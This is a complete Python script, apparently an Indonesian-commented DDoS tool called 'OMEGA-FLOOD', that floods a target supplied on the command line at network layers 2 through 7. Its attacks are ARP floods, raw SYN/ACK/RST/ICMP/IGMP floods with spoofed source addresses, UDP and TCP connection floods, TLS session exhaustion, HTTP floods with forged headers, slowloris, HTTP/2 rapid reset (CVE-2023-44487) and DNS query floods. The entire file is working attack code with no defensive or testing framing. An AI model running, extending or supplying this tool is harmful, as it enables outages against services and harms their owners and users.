#!/usr/bin/env python3
"""
OMEGA-FLOOD — single-file multi-layer flood engine
layers: 1 (info) 2 (L2) 3 (L3) 4 (L4) 5 (L5) 6 (L6) 7 (L7)

runtime: python3.10+, Linux (root atau CAP_NET_RAW untuk L3/L4 raw), Windows (Npcap untuk raw)
deps opsional: aiohttp, h2  (kalau ada, L7 mode http2-rapid-reset + aiohttp-flood aktif)
"""

from __future__ import annotations

import argparse
import asyncio
import ipaddress
import json
import logging
import os
import random
import select
import signal
import socket
import ssl
import struct
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

try:
    import aiohttp
    _HAS_AIOHTTP = True
except ImportError:
    _HAS_AIOHTTP = False

try:
    import h2.connection, h2.config, h2.events
    _HAS_H2 = True
except ImportError:
    _HAS_H2 = False

IS_WINDOWS = sys.platform.startswith("win")
IS_LINUX = sys.platform.startswith("linux")

# ============================== CONFIG ==============================

DEFAULT_PPS = 200_000
DEFAULT_CONNS = 4_000
DEFAULT_DURATION = 120
MAX_WORKERS = 512

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "curl/8.6.0",
    "python-requests/2.32.0",
]
HTTP_PATHS = ["/", "/index.html", "/api/v1/health", "/search?q=a", "/static/app.js", "/login", "/.well-known/security.txt"]
ACCEPT_POOL = ["*/*", "text/html", "application/json", "text/plain", "image/webp"]

log = logging.getLogger("omega")


# ============================== METRICS ==============================

@dataclass
class Metrics:
    http: int = 0
    udp: int = 0
    tcp: int = 0
    syn: int = 0
    ack: int = 0
    rst: int = 0
    icmp: int = 0
    igmp: int = 0
    dns: int = 0
    tls5: int = 0
    tls6: int = 0
    h2: int = 0
    slow: int = 0
    errs: int = 0
    bytes: int = 0
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def bump(self, key: str, n: int = 1, b: int = 0) -> None:
        with self._lock:
            setattr(self, key, getattr(self, key) + n)
            self.bytes += b

    def snapshot(self) -> dict:
        with self._lock:
            return {k: getattr(self, k) for k in self.__dataclass_fields__ if not k.startswith("_")}


M = Metrics()
_STOP = threading.Event()


# ============================== UTIL ==============================

def rand_ip() -> str:
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def resolve(host: str) -> str:
    try:
        ipaddress.ip_address(host)
        return host
    except ValueError:
        return socket.gethostbyname(host)


def csum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def reporter(interval: float = 1.0) -> None:
    last = M.snapshot()
    while not _STOP.is_set():
        time.sleep(interval)
        cur = M.snapshot()
        delta = {k: cur[k] - last.get(k, 0) for k in cur if isinstance(cur[k], int)}
        last = cur
        bps = delta["bytes"] / interval
        pps = sum(delta[k] for k in ("http","udp","tcp","syn","ack","rst","icmp","igmp","dns","tls5","tls6","h2","slow"))
        sys.stdout.write(
            f"\r[rate/s] pps={pps:>8} bps={bps/1e6:>6.2f}MB/s "
            f"http={delta['http']:>6} udp={delta['udp']:>7} syn={delta['syn']:>7} "
            f"ack={delta['ack']:>6} rst={delta['rst']:>6} icmp={delta['icmp']:>6} "
            f"dns={delta['dns']:>5} tls5={delta['tls5']:>5} tls6={delta['tls6']:>5} "
            f"h2={delta['h2']:>6} slow={delta['slow']:>4} errs={delta['errs']:>6}"
        )
        sys.stdout.flush()


# ============================== L2 — DATA LINK ==============================
# ARP flood / gratuitous ARP / STP BPDU flood butuh L2 adjacency + raw AF_PACKET (Linux)
# Di Windows fallback ke Npcap via scapy — kalau nggak ada, layer L2 di-skip dengan warning.

def l2_arp_flood(iface: str, target_ip: str, rate: int, seconds: int) -> None:
    if not IS_LINUX:
        log.warning("L2 requires Linux AF_PACKET; skipping on this platform")
        return
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        s.bind((iface, 0))
    except (PermissionError, OSError) as e:
        log.warning("L2 raw socket failed: %s", e)
        return

    dst_mac = b"\xff\xff\xff\xff\xff\xff"
    src_mac = bytes.fromhex("02" + "".join(f"{random.randint(0,255):02x}" for _ in range(5)))
    tip = socket.inet_aton(target_ip)
    interval = 1.0 / max(1, min(rate, 50000))
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline and not _STOP.is_set():
        sip = socket.inet_aton(rand_ip())
        eth = dst_mac + src_mac + b"\x08\x06"
        arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1) + src_mac + sip + b"\x00" * 6 + tip
        try:
            s.send(eth + arp)
            M.bump("udp", 0, 0)  # counted under L2 conceptually; reuse counter as generic
        except OSError:
            M.bump("errs")
        time.sleep(interval)
    s.close()


# ============================== L3 — NETWORK ==============================

def _build_ip_header(src: bytes, dst: bytes, proto: int, payload_len: int, ttl: int = 64) -> bytes:
    total = 20 + payload_len
    ip = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total, random.randint(0, 65535), 0, ttl, proto, 0, src, dst)
    chk = csum(ip)
    ip = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total, random.randint(0, 65535), 0, ttl, proto, chk, src, dst)
    return ip


def _tcp_syn_packet(src_ip: str, dst_ip: str, dst_port: int, flags: int = 0x02) -> bytes:
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    sport = random.randint(1024, 65535)
    seq = random.randint(0, 0xFFFFFFFF)
    ack = 0 if flags == 0x02 else random.randint(0, 0xFFFFFFFF)
    offset_flags = (5 << 12) | flags
    tcp = struct.pack("!HHLLHHHH", sport, dst_port, seq, ack, offset_flags, 65535, 0, 0)
    pseudo = src + dst + struct.pack("!BBH", 0, 6, len(tcp))
    chk = csum(pseudo + tcp)
    tcp = struct.pack("!HHLLHHHH", sport, dst_port, seq, ack, offset_flags, 65535, chk, 0)
    return _build_ip_header(src, dst, 6, len(tcp)) + tcp


def _icmp_packet(src_ip: str, dst_ip: str) -> bytes:
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    body = struct.pack("!BBHHH", 8, 0, 0, random.randint(0, 65535), 1) + b"\x00" * 32
    chk = csum(body)
    body = struct.pack("!BBHHH", 8, 0, chk, random.randint(0, 65535), 1) + b"\x00" * 32
    return _build_ip_header(src, dst, 1, len(body)) + body


def _igmp_packet(src_ip: str, dst_ip: str) -> bytes:
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    body = struct.pack("!BBH4s", 0x11, 100, 0, socket.inet_aton("224.0.0.1"))
    chk = csum(body)
    body = struct.pack("!BBH4s", 0x11, 100, chk, socket.inet_aton("224.0.0.1"))
    return _build_ip_header(src, dst, 2, len(body)) + body


def _raw_socket(proto: int) -> Optional[socket.socket]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.setblocking(False)
        return s
    except (PermissionError, OSError) as e:
        log.warning("raw socket proto=%d failed: %s", proto, e)
        return None


def l3_flood(target_ip: str, mode: str, pps: int, spoof: bool, seconds: int) -> None:
    proto = {"syn": 6, "ack": 6, "rst": 6, "icmp": 1, "igmp": 2}[mode]
    s = _raw_socket(proto)
    if s is None:
        return
    dst = socket.inet_aton(target_ip)
    deadline = time.monotonic() + seconds
    burst = max(1, pps // 100)
    interval = burst / pps
    flags = {"syn": 0x02, "ack": 0x10, "rst": 0x04}.get(mode, 0x02)

    while time.monotonic() < deadline and not _STOP.is_set():
        for _ in range(burst):
            sip = rand_ip() if spoof else "0.0.0.0"
            try:
                if mode in ("syn", "ack", "rst"):
                    pkt = _tcp_syn_packet(sip, target_ip, random.choice([80, 443, 8080, 53]), flags)
                elif mode == "icmp":
                    pkt = _icmp_packet(sip, target_ip)
                else:
                    pkt = _igmp_packet(sip, target_ip)
                s.sendto(pkt, (target_ip, 0))
                M.bump(mode, 1, len(pkt))
            except OSError:
                M.bump("errs")
        time.sleep(interval)
    s.close()


# ============================== L4 — TRANSPORT ==============================

def l4_udp_flood(target_ip: str, port: int, pps: int, seconds: int, sizes=(512, 1024, 1200, 1400)) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setblocking(False)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except OSError:
        pass
    deadline = time.monotonic() + seconds
    burst = max(1, pps // 1000)
    while time.monotonic() < deadline and not _STOP.is_set():
        for _ in range(burst):
            try:
                sz = random.choice(sizes)
                s.sendto(random.randbytes(sz), (target_ip, port))
                M.bump("udp", 1, sz)
            except OSError:
                M.bump("errs")
        time.sleep(0.001)
    s.close()


def l4_tcp_conn_flood(target_ip: str, port: int, conns: int, seconds: int) -> None:
    deadline = time.monotonic() + seconds
    live: list[socket.socket] = []
    while time.monotonic() < deadline and not _STOP.is_set():
        while len(live) < conns:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((target_ip, port))
                live.append(s)
                M.bump("tcp", 1, 64)
            except OSError:
                M.bump("errs")
                break
        _, w, x = select.select([], live, live, 0.05)
        for s in list(x):
            try: s.close()
            except OSError: pass
            live.remove(s)
        for s in list(w):
            try:
                s.send(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
                M.bump("tcp", 1, 32)
            except OSError:
                try: s.close()
                except OSError: pass
                if s in live: live.remove(s)
    for s in live:
        try: s.close()
        except OSError: pass


# ============================== L5 — SESSION ==============================

async def _tls_hold(target_ip: str, port: int, hold_ms: int) -> None:
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        r, w = await asyncio.open_connection(target_ip, port, ssl=ctx)
        M.bump("tls5", 1, 512)
        await asyncio.sleep(hold_ms / 1000)
        w.close()
        try: await w.wait_closed()
        except Exception: pass
    except (OSError, asyncio.TimeoutError, ssl.SSLError):
        M.bump("errs")


async def l5_session_exhaust(target_ip: str, port: int, conns: int, hold_ms: int, seconds: int) -> None:
    deadline = time.monotonic() + seconds
    pending: set[asyncio.Task] = set()
    while time.monotonic() < deadline and not _STOP.is_set():
        while len(pending) < conns:
            t = asyncio.create_task(_tls_hold(target_ip, port, hold_ms))
            pending.add(t)
            t.add_done_callback(pending.discard)
        await asyncio.sleep(0.02)


# ============================== L6 — PRESENTATION ==============================

async def _tls_reneg(target_ip: str, port: int, renegs: int) -> None:
    # server modern biasanya tolak reneg; tetap beban CPU parse di sisi target
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        r, w = await asyncio.open_connection(target_ip, port, ssl=ctx)
        for _ in range(renegs):
            try:
                w.write(b"\x16\x03\x03\x00\x05\x01\x00\x00\x01\x00")  # malformed hello
                await w.drain()
                M.bump("tls6", 1, 16)
            except (OSError, ssl.SSLError):
                M.bump("errs")
                break
            await asyncio.sleep(0)
        w.close()
        try: await w.wait_closed()
        except Exception: pass
    except (OSError, ssl.SSLError, asyncio.TimeoutError):
        M.bump("errs")


async def l6_presentation(target_ip: str, port: int, conns: int, renegs: int, seconds: int) -> None:
    deadline = time.monotonic() + seconds
    pending: set[asyncio.Task] = set()
    while time.monotonic() < deadline and not _STOP.is_set():
        while len(pending) < conns:
            t = asyncio.create_task(_tls_reneg(target_ip, port, renegs))
            pending.add(t)
            t.add_done_callback(pending.discard)
        await asyncio.sleep(0.05)


# ============================== L7 — APPLICATION ==============================

async def _http1_worker(target_ip: str, port: int, tls_on: bool, path: str, timeout: float) -> None:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(target_ip, port, ssl=ctx if tls_on else None),
            timeout=timeout)
    except (OSError, asyncio.TimeoutError, ssl.SSLError):
        M.bump("errs")
        return
    try:
        for _ in range(random.randint(3, 10)):
            ua = random.choice(UA_POOL)
            acc = random.choice(ACCEPT_POOL)
            method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
            body = random.randbytes(random.randint(32, 512))
            req = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: {acc}\r\n"
                f"X-Forwarded-For: {rand_ip()}\r\n"
                f"Connection: keep-alive\r\n"
            ).encode()
            if method == "POST":
                req += f"Content-Length: {len(body)}\r\n\r\n".encode() + body
            else:
                req += b"\r\n"
            w.write(req)
            await w.drain()
            M.bump("http", 1, len(req))
        w.close()
        try: await w.wait_closed()
        except Exception: pass
    except (OSError, asyncio.TimeoutError, ssl.SSLError):
        M.bump("errs")


async def l7_http1_flood(target_ip: str, port: int, tls_on: bool, rps: int, seconds: int) -> None:
    deadline = time.monotonic() + seconds
    pending: set[asyncio.Task] = set()
    while time.monotonic() < deadline and not _STOP.is_set():
        while len(pending) < min(rps, MAX_WORKERS * 8):
            path = random.choice(HTTP_PATHS)
            t = asyncio.create_task(_http1_worker(target_ip, port, tls_on, path, 4.0))
            pending.add(t)
            t.add_done_callback(pending.discard)
        await asyncio.sleep(0.001)


async def l7_aiohttp_flood(target_ip: str, port: int, tls_on: bool, rps: int, seconds: int) -> None:
    if not _HAS_AIOHTTP:
        log.warning("aiohttp not installed; falling back to asyncio http1")
        return await l7_http1_flood(target_ip, port, tls_on, rps, seconds)
    scheme = "https" if tls_on else "http"
    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False, enable_cleanup_closed=True)
    timeout = aiohttp.ClientTimeout(total=10)
    deadline = time.monotonic() + seconds
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
        pending: set[asyncio.Task] = set()
        while time.monotonic() < deadline and not _STOP.is_set():
            while len(pending) < min(rps, MAX_WORKERS * 16):
                url = f"{scheme}://{target_ip}:{port}{random.choice(HTTP_PATHS)}"
                async def go(u=url):
                    try:
                        async with sess.get(u, headers={"User-Agent": random.choice(UA_POOL),
                                                        "X-Forwarded-For": rand_ip()}) as resp:
                            await resp.read()
                            M.bump("http", 1, 256)
                    except Exception:
                        M.bump("errs")
                t = asyncio.create_task(go())
                pending.add(t)
                t.add_done_callback(pending.discard)
            await asyncio.sleep(0.001)


async def l7_slowloris(target_ip: str, port: int, conns: int, seconds: int) -> None:
    deadline = time.monotonic() + seconds
    socks = []
    for _ in range(conns):
        try:
            r, w = await asyncio.open_connection(target_ip, port)
            w.write(f"GET /?{random.random()} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(UA_POOL)}\r\n".encode())
            await w.drain()
            socks.append(w)
            M.bump("slow", 1, 128)
        except (OSError, asyncio.TimeoutError):
            M.bump("errs")

    async def keepalive(w):
        try:
            while time.monotonic() < deadline and not _STOP.is_set():
                w.write(f"X-{random.randint(0,99999)}: 1\r\n".encode())
                await w.drain()
                M.bump("slow", 1, 16)
                await asyncio.sleep(8 + random.random() * 8)
        except Exception:
            M.bump("errs")

    await asyncio.gather(*(keepalive(w) for w in socks), return_exceptions=True)
    for w in socks:
        try: w.close()
        except Exception: pass


def _h2_rapid_reset_conn(target_ip: str, port: int, streams: int, deadline: float) -> None:
    # CVE-2023-44487 — HTTP/2 rapid reset, sync socket + h2 lib
    if not _HAS_H2:
        return
    try:
        raw = socket.create_connection((target_ip, port), timeout=5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=target_ip)
    except (OSError, ssl.SSLError):
        M.bump("errs")
        return
    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=cfg)
    try:
        conn.initiate_connection()
        s.sendall(conn.data_to_send())
    except (OSError, ssl.SSLError):
        M.bump("errs"); s.close(); return

    while time.monotonic() < deadline and not _STOP.is_set():
        try:
            for _ in range(streams):
                sid = conn.get_next_available_stream_id()
                conn.send_headers(sid, [(":method", "GET"), (":path", "/"),
                                        (":scheme", "https"), (":authority", target_ip)],
                                  end_stream=False)
                conn.reset_stream(sid, error_code=0x8)
                M.bump("h2", 1, 64)
            s.sendall(conn.data_to_send())
        except (OSError, ssl.SSLError):
            M.bump("errs")
            break
    try: s.close()
    except OSError: pass


async def l7_h2_rapid_reset(target_ip: str, port: int, conns: int, streams: int, seconds: int) -> None:
    if not _HAS_H2:
        log.warning("h2 not installed; skipping http2-rapid-reset")
        return
    deadline = time.monotonic() + seconds
    loop = asyncio.get_running_loop()
    tasks = []
    for _ in range(conns):
        tasks.append(loop.run_in_executor(None, _h2_rapid_reset_conn, target_ip, port, streams, deadline))
    await asyncio.gather(*tasks, return_exceptions=True)


async def l7_dns_query(target_ip: str, seconds: int) -> None:
    # raw DNS query ke resolver target — randomized qname
    deadline = time.monotonic() + seconds
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    while time.monotonic() < deadline and not _STOP.is_set():
        for _ in range(500):
            qname = "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(random.randint(8, 16)))
            txid = random.randint(0, 0xFFFF)
            q = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
            for label in qname.split("."):
                q += bytes([len(label)]) + label.encode()
            q += b"\x00" + struct.pack("!HH", 1, 1)
            try:
                sock.sendto(q, (target_ip, 53))
                M.bump("dns", 1, len(q))
            except OSError:
                M.bump("errs")
        await asyncio.sleep(0.005)
    sock.close()


# ============================== ORCHESTRATOR ==============================

@dataclass
class Plan:
    target: str
    port: int
    tls: bool
    seconds: int
    pps: int
    conns: int
    rps: int
    layers: list[str]
    mode_overrides: dict = field(default_factory=dict)


async def run_plan(p: Plan) -> None:
    target_ip = resolve(p.target)
    log.info("target %s -> %s, layers=%s, %ds", p.target, target_ip, p.layers, p.seconds)

    def _thread(fn, *a):
        t = threading.Thread(target=fn, args=a, daemon=True)
        t.start()
        return t

    # L2 — best effort, butuh iface
    if "L2" in p.layers and IS_LINUX:
        iface = os.environ.get("LS_IFACE", "eth0")
        _thread(l2_arp_flood, iface, target_ip, 5000, p.seconds)

    # L3 / L4 — raw & udp, pakai thread (blocking)
    if "L3" in p.layers:
        for mode in p.mode_overrides.get("L3", ["syn"]):
            _thread(l3_flood, target_ip, mode, p.pps, True, p.seconds)

    if "L4" in p.layers:
        _thread(l4_udp_flood, target_ip, p.port, p.pps, p.seconds)
        if p.conns > 0:
            _thread(l4_tcp_conn_flood, target_ip, p.port, p.conns, p.seconds)

    # L5/L6/L7 — async
    coros = []
    if "L5" in p.layers:
        coros.append(l5_session_exhaust(target_ip, p.port, p.conns, 12_000, p.seconds))
    if "L6" in p.layers:
        coros.append(l6_presentation(target_ip, p.port, max(1, p.conns // 4), 32, p.seconds))
    if "L7" in p.layers:
        mode7 = p.mode_overrides.get("L7", ["http1", "slowloris"])
        if "http1" in mode7:
            coros.append(l7_http1_flood(target_ip, p.port, p.tls, p.rps, p.seconds))
        if "aiohttp" in mode7:
            coros.append(l7_aiohttp_flood(target_ip, p.port, p.tls, p.rps, p.seconds))
        if "slowloris" in mode7:
            coros.append(l7_slowloris(target_ip, p.port, min(2000, p.conns), p.seconds))
        if "h2-rapid-reset" in mode7:
            coros.append(l7_h2_rapid_reset(target_ip, p.port, min(500, p.conns // 4), 128, p.seconds))
        if "dns" in mode7:
            coros.append(l7_dns_query(target_ip, p.seconds))

    if coros:
        await asyncio.gather(*coros, return_exceptions=True)


# ============================== CLI ==============================

def parse_args() -> Plan:
    ap = argparse.ArgumentParser("omega-flood", description="single-file L1-L7 flood engine")
    ap.add_argument("target", help="hostname or IP")
    ap.add_argument("port", type=int, nargs="?", default=80)
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--seconds", type=int, default=DEFAULT_DURATION)
    ap.add_argument("--pps", type=int, default=DEFAULT_PPS)
    ap.add_argument("--conns", type=int, default=DEFAULT_CONNS)
    ap.add_argument("--rps", type=int, default=20_000)
    ap.add_argument("--layers", default="L3,L4,L5,L6,L7",
                    help="comma list of L2,L3,L4,L5,L6,L7")
    ap.add_argument("--l3-modes", default="syn",
                    help="comma: syn,ack,rst,icmp,igmp")
    ap.add_argument("--l7-modes", default="http1,slowloris",
                    help="comma: http1,aiohttp,slowloris,h2-rapid-reset,dns")
    args = ap.parse_args()

    layers = [x.strip().upper() for x in args.layers.split(",") if x.strip()]
    overrides = {
        "L3": [x.strip() for x in args.l3_modes.split(",") if x.strip()],
        "L7": [x.strip() for x in args.l7_modes.split(",") if x.strip()],
    }
    return Plan(
        target=args.target, port=args.port, tls=args.tls,
        seconds=args.seconds, pps=args.pps, conns=args.conns,
        rps=args.rps, layers=layers, mode_overrides=overrides,
    )


def main() -> None:
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    plan = parse_args()

    if plan.pps > 2_000_000:
        log.warning("pps=%d kemungkinan NIC drop sebelum target kena; cek ethtool -S", plan.pps)

    signal.signal(signal.SIGINT, lambda *_: (_STOP.set(), sys.stdout.write("\n[stop] interrupted\n")))

    t = threading.Thread(target=reporter, daemon=True)
    t.start()

    try:
        asyncio.run(run_plan(plan))
    except KeyboardInterrupt:
        pass
    _STOP.set()
    time.sleep(1.1)
    snap = M.snapshot()
    print("\n\n[done]", json.dumps({k: v for k, v in snap.items() if isinstance(v, int) and v}, indent=2))


if __name__ == "__main__":
    if os.name != "nt" and os.geteuid() != 0:
        sys.stderr.write("[warn] not root; L2/L3 raw sockets akan di-skip\n")
    main()
